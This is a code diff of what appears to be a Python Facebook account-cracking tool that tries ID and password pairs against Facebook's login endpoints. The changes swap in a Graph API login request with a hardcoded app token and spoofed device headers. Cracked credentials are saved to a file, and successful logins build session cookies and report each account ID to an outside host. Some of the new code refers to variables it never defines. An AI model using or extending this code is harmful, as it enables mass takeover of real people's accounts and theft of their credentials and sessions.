@@ -914,39 +914,78 @@ def m1(idf,pwv):
             pw = pw.lower()
             get = session.get(f"https://m.prod.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
             date = {
-            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
-            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
-            "email":idf,"pass":pw,"Host":"https://m.prod.facebook.com/login/save-device/?login"}
-            respons =({
-            'Host': f'm.prod.facebook.com',
-           'accept': 'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5','accept-encoding': 'gzip,deflate',
-           'accept-language': 'es_LA,id;q=0.9','content-length': f'{str(rr(1111,9999))}',
-           'content-type': 'application/x-www-form-urlencoded','origin': 'https://m.facebook.com',
-           'referer': f'https://m.facebook.com/reg/?cid=103&refid=8',
-           'user-agent': pro,
-           'sec-fetch-dest': f'{random.choice(["empty","document"])}',
-           'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
-           'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
-           'sec-fetch-user': f'{random.choice(["?1","empty"])}',
-           'x-requested-with': 'www.facebook.com',
-           'x-xss-protection': '0',
-           'sec-ch-ua': '" Not A;Brand";v="99", "Microsoft Edge";v="101", "Chromium";v="101"',
-           'sec-ch-ua-mobile': '?0'})
-            yz = session.post(f'https://m.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100', headers=respons, data=date, allow_redirects=False)
-            if "checkpoint" in session.cookies.get_dict().keys():
-             idd = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+"email": idf,
+"password": pw,
+"method": "post",
+"pretty": "false",
+"format": "json",
+"server_timestamps": "true",
+"locale": "en_US",
+"purpose": "fetch",
+"fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
+"fb_api_caller_class": "graphservice",
+"client_doc_id": str(random.randint(111111111111111111111111111111,999999999999999999999999999999)),
+"lois_settings": "lois_token",
+"lara_override": "server_params",
+"is_from_logged_out": "0",
+"layered_homepage_experiment_group": "null",
+"device_id": str(uuid.uuid4()),
+"waterfall_id": str(uuid.uuid4()),
+"INTERNAL__latency_qpl_instance_id": "71821365400215",
+"is_platform_login": "0",
+"header_transparency_event_location": "login",
+"INTERNAL__latency_qpl_marker_id": str(random.randint(11111111,99999999)),
+"family_device_id": str(uuid.uuid4()),
+"offline_experiment_group": "caa_iteration_v6_perf_fb_2",
+"INTERNAL_INFRA_THEME": "harm_f",
+"headers_flow_id": str(uuid.uuid4()),
+"transparency_event_type": "affirmative_action",
+"header_transparency_event_name": "login_button_clicked",
+"is_from_logged_in_switcher": "0",
+"bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
+"app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
+"scale": "2",
+"styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1",
+"using_white_navbar": "True",
+"pixel_ratio": "2",
+"is_push_on": "True",
+"bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec",
+"fb_api_analytics_tags": '["GraphServices"]',
+"client_trace_id": str(uuid.uuid4()),
+"generate_session_cookies": "1",
+"generate_analytics_claim": "1",
+"error_detail_type": "button_with_disabled"}
+            respons ={
+"x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', 
+"x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}",
+"content-type": "application/x-www-form-urlencoded",
+"x-fb-connection-type": "WIFI",
+"x-fb-background-state": "1",
+"x-graphql-request-purpose": "fetch",
+"user-agent": useragent(),
+"authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event",
+"x-graphql-client-library": "graphservice",
+"x-fb-privacy-context": "3643298472347298",
+"x-fb-device-group": "3273",
+"x-tigon-is-retry": "False",
+"priority": "u=3,i",
+"accept-encoding": "gzip, deflate",
+"x-fb-http-engine": "Liger",
+"x-fb-client-ip": "True",
+"x-fb-server-cluster": "True"}
+            yz = session.post(f"https://b-graph.facebook.com/auth/login", headers=respons, data=date, allow_redirects=False)
+            if "www.facebook.com" in q['error']['message']:
              cp+=1
             if 'y' in cp_xdx:
-                print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{idd}|{pw}{xxx}')
+                print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
                 open(' /sdcard/ATOM-CP.txt', 'a').write(idf+'|'+pw)
                 cp.append(idf)
                 break
-            elif "c_user" in session.cookies.get_dict().keys():
-                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                idg = re.findall('c_user=(.*);xs', coki)[0]
-                url = f"https://shishirx.pythonanywhere.com/lock?uid={idf}"
+            elif "session_key" in yz:
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"{ckkk}"
+                idg=str(q['uid'])
+                url = f"https://shishirx.pythonanywhere.com/lock?uid={idg}"
                 reqx = requests.get(url).text
                 if 'live' in reqx:
                  print(f'\r\r{G}[ATOM-LIVE-RECEIVED]: {idg} | {pw}')
